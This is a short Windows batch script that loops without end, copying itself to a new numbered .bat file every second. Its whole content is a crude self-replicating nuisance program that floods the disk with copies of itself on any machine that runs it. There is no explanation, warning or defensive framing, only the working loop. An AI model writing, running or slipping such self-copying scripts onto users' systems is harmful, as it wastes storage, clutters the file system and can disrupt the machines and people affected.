set /A wow=0
:banget
set /A wow=%wow%+1
copy %0 %0%wow%.bat
timeout 1
GOTO banget
